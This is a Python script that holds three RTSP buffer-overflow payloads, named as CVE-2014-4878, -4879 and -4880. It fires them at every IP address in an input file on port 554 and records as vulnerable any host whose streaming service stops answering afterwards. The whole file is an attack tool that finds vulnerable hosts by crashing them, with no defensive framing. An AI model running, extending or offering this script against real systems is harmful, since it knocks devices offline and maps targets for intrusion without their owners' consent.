#!/usr/bin/env python

import sys
import socket
from time import sleep

def cve20144878(host):
	payload = 'PLAY rtsp://%s/ RTSP/1.0\r\n' % host
	payload += 'CSeq: 7\r\n'
	payload += 'Authorization: Basic AAAAAAA\r\n'
	payload += 'Content-length: 3200\r\n\r\n'
	payload += 'A' * 3200
	return payload

def cve20144879(host):
	payload = 'PLAY rtsp://%s/ RTSP/1.0\r\n' % host
	payload += 'Authorization'
	payload += 'A' * 1024
	payload += ': Basic AAAAAAA\r\n\r\n'
	return payload

def cve20144880(host):
	payload = 'PLAY rtsp://%s/ RTSP/1.0\r\n' % host
	payload += 'CSeq: 7\r\n'
	payload += 'Authorization: Basic '
	payload += 'A' * 2048
	payload += '\r\n\r\n'
	payload += 'B' * 1024
	return payload

def check_vul(host, payload):
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect((host, 554))
	soc.send(payload)
	soc.close()

	sleep(0.2)
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		soc.connect((host, 554))
	except socket.error:
		return True
	soc.close()
	
	return False


ip_file = open('ip.txt', "r")
vul_ip = open('vul_ip.txt', "w")

for host in ip_file:
	payload = cve20144878(host)
	if check_vul(host, payload):
		vul_ip.write(host)
		continue

	payload = cve20144879(host)
	if check_vul(host, payload):
		vul_ip.write(host)
		continue

	payload = cve20144880(host)
	if check_vul(host, payload):
		vul_ip.write(host)
		continue
ip_file.close()
vul_ip.close()
